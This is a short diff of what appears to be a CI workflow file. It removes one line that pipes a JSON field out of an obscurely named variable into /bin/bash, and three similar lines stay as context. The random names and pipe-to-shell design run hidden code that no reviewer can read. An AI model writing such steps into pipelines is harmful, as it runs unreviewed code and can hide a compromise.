@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$j19016" | jq -r .nsguo49 | /bin/bash
           echo $km1598 | jq -r .xkan6875 | /bin/bash
           echo $fgp71749 | jq -r .ksnd99245 | /bin/bash
-          echo $gy863 | jq -r .tqp26 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
